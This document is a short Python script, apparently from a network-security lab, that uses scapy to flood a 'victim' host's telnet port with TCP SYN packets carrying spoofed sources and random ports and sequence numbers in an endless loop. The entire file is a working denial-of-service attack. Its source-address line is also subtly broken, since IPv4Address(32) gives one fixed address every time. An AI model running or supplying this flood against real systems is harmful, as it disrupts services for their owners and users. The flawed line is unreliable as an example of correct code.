#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

IP_victim = "10.9.0.5"

ip = IP(dst = IP_victim)
tcp = TCP(dport= 23, flags= 'S')
pkt = ip/tcp

while True:
	pkt[IP].src = str( IPv4Address( 32 ) )
	pkt[TCP].sport = getrandbits(16)
	pkt[TCP].seq = getrandbits(32)
	send(pkt, verbose=0)
